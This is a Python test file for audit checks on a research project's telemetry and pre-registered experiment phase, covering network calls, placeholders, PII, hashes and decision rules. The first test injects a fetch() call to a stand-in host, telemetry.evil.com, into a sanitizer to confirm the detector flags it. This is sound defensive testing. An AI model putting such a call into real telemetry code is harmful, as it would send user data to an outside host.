"""Tests for Act phase and Telemetry checks (ACT, TEL)."""

import hashlib
import json
from audit import checks_act_telemetry
from audit.model import Status


def test_tel_01_prohibited_network_calls(make_repos):
    docs_dir, code_dir, repo = make_repos(full_passing=True)
    res = checks_act_telemetry.check_tel_01(repo)
    assert res.status == Status.PASS

    # Inject fetch() into sanitize.ts
    sanitize_ts = code_dir / "extension" / "src" / "telemetry" / "sanitize.ts"
    sanitize_ts.write_text("export function sanitize() { fetch('https://telemetry.evil.com'); return {}; }", encoding="utf-8")
    res = checks_act_telemetry.check_tel_01(repo)
    assert res.status == Status.FAIL
    assert "Chamadas de rede proibidas" in res.found
    assert "fetch(" in res.found


def test_act_02_missing_tag_and_placeholders(make_repos):
    docs_dir, code_dir, repo = make_repos(full_passing=True)
    # In mock repo without git tag act-prereg-v1, check_act_02 fails
    res = checks_act_telemetry.check_act_02(repo)
    assert res.status == Status.FAIL
    assert "Tag git 'act-prereg-v1' ausente" in res.found

    # Test detection of PROPOSTO placeholder
    metrics_file = docs_dir / "docs" / "cbl" / "act" / "metrics-definition.md"
    metrics_file.write_text("# Métricas\nStatus: PROPOSTO", encoding="utf-8")
    res = checks_act_telemetry.check_act_02(repo)
    assert res.status == Status.FAIL
    assert "Contém termo 'PROPOSTO'" in res.found


def test_act_03_results_missing_or_placeholders(make_repos):
    docs_dir, code_dir, repo = make_repos(full_passing=True)
    # Passing state
    res = checks_act_telemetry.check_act_03(repo, min_participants=10)
    assert res.status == Status.PASS

    # Placeholders in results.md
    results_file = docs_dir / "docs" / "cbl" / "act" / "results.md"
    results_file.write_text("# Resultados\nN = {{ N }}\nsummary_sha256: 123", encoding="utf-8")
    res = checks_act_telemetry.check_act_03(repo, min_participants=10)
    assert res.status == Status.FAIL
    assert "Placeholders presentes" in res.found

    # Insufficient participants
    results_file.write_text("# Resultados\nN = 5 participantes por condição.\nsummary_sha256: 123", encoding="utf-8")
    res = checks_act_telemetry.check_act_03(repo, min_participants=10)
    assert res.status == Status.FAIL
    assert "N insuficiente" in res.found


def test_act_04_pii_detection(make_repos):
    docs_dir, code_dir, repo = make_repos(full_passing=True)
    res = checks_act_telemetry.check_act_04(repo)
    assert res.status == Status.PASS

    # Plant a fake CPF in a tracked docs file
    doc_file = docs_dir / "docs" / "cbl" / "act" / "notes.md"
    doc_file.write_text("Participante 1: CPF 123.456.789-00", encoding="utf-8")
    res = checks_act_telemetry.check_act_04(repo)
    assert res.status == Status.FAIL
    assert "dados pessoais (PII) encontrados" in res.found
    assert "CPF detectado" in res.details
    doc_file.unlink()

    # Plant personal email
    doc_file.write_text("Contato do voluntário: joao.silva@gmail.com", encoding="utf-8")
    res = checks_act_telemetry.check_act_04(repo)
    assert res.status == Status.FAIL
    assert "dados pessoais (PII) encontrados" in res.found
    # Ensure raw full email is not leaked, only masked or truncated
    assert "@gmail.com" not in res.details or "***" in res.details


def test_act_07_hash_divergence(make_repos):
    docs_dir, code_dir, repo = make_repos(full_passing=True)
    # Check PASS initially
    res = checks_act_telemetry.check_act_07(repo)
    assert res.status == Status.PASS

    # Alter summary.json without updating results.md
    summary_file = code_dir / "analysis" / "act" / "out" / "summary.json"
    summary_file.write_text('{"metrics": {"modified": true}}', encoding="utf-8")
    res = checks_act_telemetry.check_act_07(repo)
    assert res.status == Status.FAIL
    assert "Hash divergente" in res.found


def test_act_08_decision_rule_fidelity(make_repos):
    docs_dir, code_dir, repo = make_repos(full_passing=True)
    res = checks_act_telemetry.check_act_08(repo)
    assert res.status == Status.PASS

    # Violate pre-registered rule: condition_B accuracy is worse than condition_A, but decision is GO
    bad_summary = {
        "metrics": {
            "condition_A": {"accuracy_assisted": {"mean": 0.85}},
            "condition_B": {"accuracy_assisted": {"mean": 0.50}},
        }
    }
    summary_file = code_dir / "analysis" / "act" / "out" / "summary.json"
    summary_file.write_text(json.dumps(bad_summary), encoding="utf-8")
    res = checks_act_telemetry.check_act_08(repo)
    assert res.status == Status.FAIL
    assert "viola regra pré-registrada" in res.found
